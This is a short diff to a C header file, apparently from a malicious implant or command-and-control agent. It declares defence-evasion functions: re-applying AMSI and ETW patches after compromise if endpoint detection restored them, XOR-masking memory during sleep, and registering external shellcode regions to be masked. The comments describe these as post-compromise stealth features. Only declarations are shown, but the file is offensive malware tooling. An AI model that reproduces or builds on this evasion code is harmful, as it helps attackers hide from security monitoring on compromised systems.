@@ -11,10 +11,14 @@ void evasion_init(void);
 /* Re-apply AMSI + ETW patches post-compromise (if EDR restored them) */
 void amsi_bypass(void);
 
-/* XOR-masks .text + PAGE_NOACCESS during sleep, runs from .evasn section.
- * Masking is skipped while any pipe-server conn_thread is active to avoid
- * PAGE_NOACCESS faulting threads executing in .text. */
+/* Sleeps via NtDelayExecution; optionally masks registered external regions.
+ * Runs from .evasn — never touches the agent's own .text.
+ * Masking is skipped while any conn_thread is active (g_conn_thread_count > 0). */
 void sleep_masked(DWORD ms);
+
+/* Register an external shellcode/payload region for XOR masking during sleep.
+ * Only call for memory that will NOT be executing when sleep_masked fires. */
+void evasion_register_region(void *base, SIZE_T sz);
 
 /* Call from conn_thread start/end to inhibit sleep masking while active. */
 void evasion_conn_enter(void);
